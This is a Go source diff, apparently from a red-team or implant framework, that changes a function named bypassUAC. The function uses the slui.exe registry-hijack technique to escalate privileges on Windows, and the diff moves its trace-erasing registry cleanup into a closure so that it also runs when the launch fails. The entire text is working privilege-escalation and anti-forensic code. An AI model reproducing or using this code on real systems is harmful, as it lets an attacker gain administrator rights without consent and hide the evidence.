@@ -338,22 +338,26 @@ func bypassUAC(command string) (err error) {
 	if err != nil {
 		return
 	}
+	cleanup := func() {
+		// Wait for the command to trigger
+		time.Sleep(time.Second * 3)
+		// Clean up
+		// {{if .Debug}}
+		log.Println("cleaning the registry up")
+		// {{end}}
+		err = deleteRegistryKey(`Software\Classes\exefile\shell\open`, "command")
+		err = deleteRegistryKey(`Software\Classes\exefile\shell\`, "open")
+	}
 	shell32 := syscall.MustLoadDLL("Shell32.dll")
 	shellExecuteW := shell32.MustFindProc("ShellExecuteW")
 	runasStr, _ := syscall.UTF16PtrFromString("runas")
 	sluiStr, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\slui.exe`)
 	r1, _, err := shellExecuteW.Call(uintptr(0), uintptr(unsafe.Pointer(runasStr)), uintptr(unsafe.Pointer(sluiStr)), uintptr(0), uintptr(0), uintptr(1))
 	if r1 < 32 {
+		cleanup()
 		return
 	}
-	// Wait for the command to trigger
-	time.Sleep(time.Second * 3)
-	// Clean up
-	// {{if .Debug}}
-	log.Println("cleaning the registry up")
-	// {{end}}
-	err = deleteRegistryKey(`Software\Classes\exefile\shell\open`, "command")
-	err = deleteRegistryKey(`Software\Classes\exefile\shell\`, "open")
+	cleanup()
 	return
 }
 
